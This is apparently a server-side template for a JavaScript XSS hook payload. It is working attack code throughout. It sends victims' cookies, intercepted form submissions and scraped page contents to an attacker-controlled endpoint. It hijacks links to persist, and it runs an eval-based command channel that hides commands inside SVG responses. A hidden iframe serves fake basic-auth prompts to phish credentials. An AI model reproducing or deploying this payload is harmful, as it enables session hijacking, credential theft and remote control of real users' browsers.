(async () => {
    var UNKNOWN_TYPE = 0;
    var PAGEDUMP_TYPE = 1;
    var JSON_TYPE = 2;
    var IMAGE_TYPE = 3;
    var JS_TYPE = 4;
    var FORMDATA_TYPE = 5;
    var FAKEAUTH_TYPE = 6;
    var COOKIE_TYPE = 7;

    let url = new URL(window.urc);
    let baseURLaghjk = `${url.protocol}//${url.host}`;

    async function sendLoot(title, content, type) {
        await fetch({{home|tojson}}, {
            method: "POST",
            body: JSON.stringify({
                "type": type,
                "title": title,
                "content": btoa(content)
            }),
            headers: {
                "Content-Type": "application/json"
            }
        });
    }

    {% if hook.stealCookie %}
    try {
        await sendLoot("Cookie Dump", document.cookie, COOKIE_TYPE);
    } catch {}
    {% endif %}

    {% if hook.interceptSubmittedForms %}
    async function intercept(e) {
        e.preventDefault();
        try {
            let data = "";
            for(const entry of new FormData(e.target)){
                data += `${entry[0]}: ${entry[1]}\n`;
            }
            await sendLoot("Intercepted Form", data, FORMDATA_TYPE);
        } catch {}
        e.target.submit();
    }

    setInterval(() => {
        Array.from(document.forms).forEach(f => {
            try {
                f.removeEventListener("submit", intercept);
                f.addEventListener("submit", intercept);
            } catch {}
        });
    }, 200)
    {% endif %}

    {% if hook.linksPersistence %}
    try {
        async function loadPage (e) {
            e.preventDefault();
            const url = new URL(e.target.href);
            let r = await fetch(e.target.href);
            window.history.pushState({}, "", url);
            document.open();
            document.write(await r.text());
        }
        setInterval(() => {
            document.querySelectorAll("a").forEach(e => {
                e.removeEventListener("click", loadPage);
                e.addEventListener("click", loadPage);
            });
        }, 200);

        async function popper(e) {
            let r = await fetch(e.originalTarget.location.href);
            document.open();
            document.write(await r.text());
        }
        setInterval(() => {
            window.removeEventListener("popstate", popper);
            window.addEventListener("popstate", popper);
        }, 200);
    } catch {}
    {% endif %}

    {% if hook.evalConsole %}
    (() => {
        let adj = ["important", "astonishing", "equable", "measly", "piquant", "puzzling", "discreet", "assorted", "workable", "repulsive"];
        let names = ["caption", "reason", "humor", "dime", "arm", "grandfather", "liquid", "stitch", "string", "stream", "ball", "offer"];

        let id = encodeURIComponent(btoa(`${adj[Math.floor(Math.random() * adj.length)]}-${names[Math.floor(Math.random() * names.length)]}`));
        let cmdURL = `${baseURLaghjk}/assets/{{ hook.xid }}/${id}/icon.svg?t=`;
        let rURL = `${baseURLaghjk}/analytics/events/{{ hook.xid }}/${id}`;
        const loope = async () => {
            try {
                let r = await fetch(cmdURL + Date.now());
                let icon = await r.text();
                let parser = new DOMParser();
                let doc = parser.parseFromString(icon, "application/xml");
                const svgNode = doc.querySelector("svg");
                let cmd = svgNode.attributes.nonce.value;
                if (cmd.length > 0) {
                    let out = eval(atob(cmd));
                    await fetch(rURL, {
                        method: "POST",
                        body: btoa(out)
                    });
                }
            } catch {}
            setTimeout(loope, Math.floor(Math.random() * 16) * 1000);
        };
        loope();
    })()
    {% endif %}

    {% if toScrape_len > 0 %}
                   
    async function serializePage(url=null) {

        function URLToURI(url){
            return  fetch(url)
                    .then( response => response.blob() )
                    .then( blob => new Promise( callback =>{
                        let reader = new FileReader();
                        reader.onload = function(){ callback(this.result) };
                        reader.readAsDataURL(blob);
                    }) ) ;
        }
        let docHTML = "";
        if (url == null) {
            docHTML = document.documentElement.outerHTML;
        } else {
            let r = await fetch(url);
            docHTML = await r.text();
        }

        let parser = new DOMParser();
        let dom = parser.parseFromString(docHTML, "text/html");
        
        let css = [];
        for (let i = 0; i < document.styleSheets.length; i++) {
            try {
                let sheet = document.styleSheets[i];
                let rules = ("cssRules" in sheet) ? sheet.cssRules : sheet.rules;
                if (rules) {
                    css.push(`\n/* Stylesheet : ${sheet.href || "[inline styles]"} */`);
                    for (let j = 0; j < rules.length; j++) {
                        let rule = rules[j];
                        if ("cssText" in rule) {
                            css.push(rule.cssText);
                        } else {
                            css.push(`${rule.selectorText} {\n${rule.style.cssText}\n}\n`);
                        }
                    }
                }
            } catch {}
        }
        let cssInline = css.join("\n") + "\n";
        dom.querySelectorAll("style").forEach(e => {
            let comment = dom.createComment(`Original css style element: ${e.outerHTML}`);
            e.replaceWith(comment);
        });
        dom.querySelectorAll("link").forEach(e => {
            if (e.rel === "stylesheet" || e.as === "style" || e.type === "text/css") {
                let comment = dom.createComment(`Original css: ${e.outerHTML}`);
                e.replaceWith(comment);
            }
        });
        let cssEl = dom.createElement("style");
        if (cssEl.styleSheet) {
            cssEl.styleSheet.cssText = cssInline;
        } else {
            cssEl.appendChild(document.createTextNode(cssInline));
        }
        
        dom.body.appendChild(cssEl);
        
        let scripts = dom.scripts;
        
        for (let i = 0; i < scripts.length; i++) {
            if (scripts[i].src.length > 0) {
                let comment = dom.createComment(`Original script: ${scripts[i].outerHTML}`);
                let script = dom.createElement("script");
                try {
                    script.src = await URLToURI(scripts[i].src);
                    scripts[i].replaceWith(comment, script);
                } catch {
                    scripts[i].replaceWith(comment);
                }
            }
        }
        
        let images = dom.querySelectorAll("img");
        for (let i = 0; i < images.length; i++) {
            let comment = dom.createComment(`Original image: ${images[i].outerHTML}`);
            if (images[i].src.length > 0) {
                try {
                    let img = images[i].cloneNode();
                    img.src = await URLToURI(images[i].src);
                    images[i].replaceWith(comment, img);
                } catch {
                    images[i].replaceWith(comment);
                }
            }
        }

        return dom.documentElement.outerHTML;
    }
    

    let serialized = "";

    {% if hook.scrape %}
    try {
        try {
            serialized = await serializePage();
        } catch(e) {
            serialized = "failed";
        }
        await  sendLoot(window.location.href + " Dump (XSS Page)", serialized, PAGEDUMP_TYPE);
    } catch {}
    {% endif %}


    
    let pages = {{toScrape|tojson}};
    
    for (let i = 0; i < pages.length; i++) {
        const p = pages[i];
        serialized = "";
        try {
            try {
                serialized = await serializePage(p);
            } catch(e) {
                serialized = "failed";
            }
            await  sendLoot(p + " Dump", serialized, PAGEDUMP_TYPE);
        } catch {}
    }

    {% endif %}

    {% if cc_len > 0 %}
    (async () => {
        try {
        {{ hook.customCode }}
        } catch {}
    })()
    {% endif %}

    {% if hook.fakeBasicAuth %}
    var ifr = document.createElement("iframe");
    ifr.setAttribute("src", `${baseURLaghjk}/ba/{{ hook.xid }}`);
    ifr.setAttribute("style", "display:none;width:0px;height:0px;");
    document.body.appendChild(ifr);
    {% endif %}

})()